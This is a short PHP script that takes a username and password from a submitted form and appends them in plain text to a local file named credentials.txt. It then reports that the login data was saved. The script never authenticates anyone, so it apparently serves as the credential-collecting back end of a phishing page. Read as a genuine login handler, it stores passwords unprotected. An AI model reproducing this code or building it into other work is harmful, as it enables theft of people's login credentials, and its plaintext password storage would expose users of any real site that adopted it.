<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the data to a text file
    $file = 'credentials.txt';
    $data = "Username: $username, Password: $password\n";
    file_put_contents($file, $data, FILE_APPEND);

    echo "Login data saved successfully.";
}
?>